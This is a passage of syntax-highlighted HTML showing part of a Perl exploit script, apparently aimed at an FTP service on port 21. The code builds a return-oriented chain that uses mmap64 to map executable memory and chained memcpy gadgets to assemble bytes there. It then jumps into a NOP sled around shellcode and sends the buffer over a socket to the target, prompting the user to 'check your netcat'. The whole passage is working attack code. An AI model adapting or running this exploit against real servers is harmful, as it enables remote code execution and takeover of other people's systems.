alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$stack</code> <code class="plain">= </code><code class="string">"KCOPERULEZKCOPERULEZKC"</code> <code class="plain">. </code><code class="string">"C"</code> <code class="plain">x </code><code class="variable">$padding</code> <code class="plain">. </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$mmap64</code><code class="plain">). </code><code class="comments"># mmap64()</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$largepopret</code><code class="plain">). </code><code class="comments"># add&nbsp;&nbsp;&nbsp;&nbsp; esp, 20h; pop; pop</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x00\x00\x00\x10"</code><code class="plain">. </code><code class="comments"># mmap start</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x00\x10\x00\x00"</code><code class="plain">. </code><code class="comments"># mmap size</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x07\x00\x00\x00"</code><code class="plain">. </code><code class="comments"># mmap prot</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x32\x00\x00\x00"</code><code class="plain">. </code><code class="comments"># mmap flags</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\xff\xff\xff\xff"</code><code class="plain">. </code><code class="comments"># mmap fd</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x00\x00\x00\x00"</code><code class="plain">. </code><code class="comments"># mmap offset</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x00\x00\x00\x00"</code><code class="plain">. </code><code class="comments"># mmap offset&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x00\x00\x00\x00"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x00\x00\x00\x00"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x00\x00\x00\x00"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x00\x00\x00\x00"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$memcpy</code><code class="plain">). </code><code class="comments"># memcpy()</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$pop3ret</code><code class="plain">). </code><code class="comments"># pop; pop; pop; retn</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x00\x00\x00\x10"</code><code class="plain">. </code><code class="comments"># destination</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$byte1</code><code class="plain">). </code><code class="comments"># origin</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x02\x00\x00\x00"</code><code class="plain">. </code><code class="comments"># number of bytes to copy</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$memcpy</code><code class="plain">). </code><code class="comments"># memcpy()</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$pop3ret</code><code class="plain">). </code><code class="comments"># pop; pop; pop; retn</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x02\x00\x00\x10"</code><code class="plain">. </code><code class="comments"># destination</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$byte2</code><code class="plain">). </code><code class="comments"># origin</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x01\x00\x00\x00"</code><code class="plain">. </code><code class="comments"># number of bytes to copy</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$memcpy</code><code class="plain">). </code><code class="comments"># memcpy()</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$pop3ret</code><code class="plain">). </code><code class="comments"># pop; pop; pop; retn</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x03\x00\x00\x10"</code><code class="plain">. </code><code class="comments"># destination</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$byte3</code><code class="plain">). </code><code class="comments"># origin</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x01\x00\x00\x00"</code><code class="plain">. </code><code class="comments"># number of bytes to copy</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$memcpy</code><code class="plain">). </code><code class="comments"># memcpy()</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$pop3ret</code><code class="plain">). </code><code class="comments"># pop; pop; pop; retn</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x04\x00\x00\x10"</code><code class="plain">. </code><code class="comments"># destination</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$byte4</code><code class="plain">). </code><code class="comments"># origin</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x03\x00\x00\x00"</code><code class="plain">. </code><code class="comments"># number of bytes to copy</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$memcpy</code><code class="plain">). </code><code class="comments"># memcpy()</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$pop3ret</code><code class="plain">). </code><code class="comments"># pop; pop; pop; retn</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x07\x00\x00\x10"</code><code class="plain">. </code><code class="comments"># destination</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$byte5</code><code class="plain">). </code><code class="comments"># origin</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x01\x00\x00\x00"</code><code class="plain">. </code><code class="comments"># number of bytes to copy</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$memcpy</code><code class="plain">). </code><code class="comments"># memcpy()</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$pop3ret</code><code class="plain">). </code><code class="comments"># pop; pop; pop; retn</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x08\x00\x00\x10"</code><code class="plain">. </code><code class="comments"># destination</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$byte6</code><code class="plain">). </code><code class="comments"># origin</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x05\x00\x00\x00"</code><code class="plain">. </code><code class="comments"># number of bytes to copy</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$memcpy</code><code class="plain">). </code><code class="comments"># memcpy()</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$pop3ret</code><code class="plain">). </code><code class="comments"># pop; pop; pop; retn</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x0d\x00\x00\x10"</code><code class="plain">. </code><code class="comments"># destination</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$byte7</code><code class="plain">). </code><code class="comments"># origin</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x01\x00\x00\x00"</code><code class="plain">. </code><code class="comments"># number of bytes to copy</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$memcpy</code><code class="plain">). </code><code class="comments"># memcpy()</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$pop3ret</code><code class="plain">). </code><code class="comments"># pop; pop; pop; retn</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x0e\x00\x00\x10"</code><code class="plain">. </code><code class="comments"># destination</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$byte8</code><code class="plain">). </code><code class="comments"># origin</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x01\x00\x00\x00"</code><code class="plain">. </code><code class="comments"># number of bytes to copy</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$memcpy</code><code class="plain">). </code><code class="comments"># memcpy()</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$pop3ret</code><code class="plain">). </code><code class="comments"># pop; pop; pop; retn</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x0f\x00\x00\x10"</code><code class="plain">. </code><code class="comments"># destination</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">pack</code><code class="plain">(</code><code class="string">"V"</code><code class="plain">, </code><code class="variable">$byte9</code><code class="plain">). </code><code class="comments"># origin</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x02\x00\x00\x00"</code><code class="plain">. </code><code class="comments"># number of bytes to copy</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x00\x00\x00\x10"</code><code class="plain">. </code><code class="comments"># JUMP TO 0x10000000 rwxp address&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"\x90"</code> <code class="plain">x 100 . </code><code class="variable">$shellcode</code> <code class="plain">. </code><code class="string">"\x90"</code> <code class="plain">x 10;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">print</code> <code class="string">"Sending exploit buffer!\n"</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">my</code> <code class="variable">$sock</code> <code class="plain">= IO::</code><code class="functions">Socket</code><code class="plain">::INET-&gt;new(PeerAddr =&gt; </code><code class="variable">$target</code><code class="plain">,</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">PeerPort =&gt; 21,</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">Proto&nbsp;&nbsp;&nbsp; =&gt; </code><code class="string">'tcp'</code><code class="plain">);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$v</code> <code class="plain">= &lt;</code><code class="variable">$sock</code><code class="plain">&gt;;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">print</code> <code class="variable">$sock</code> <code class="string">"\x00"</code> <code class="plain">x </code><code class="variable">$align</code> <code class="plain">. </code><code class="string">"\xff"</code> <code class="plain">. </code><code class="variable">$stack</code> <code class="plain">. </code><code class="string">"\n"</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">print</code> <code class="string">"Check your netcat?\n"</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">while</code><code class="plain">(&lt;</code><code class="variable">$sock</code><code class="plain">&gt;) {</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">print</code><code class="plain">;&nbsp; </code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="keyword">sub</code> 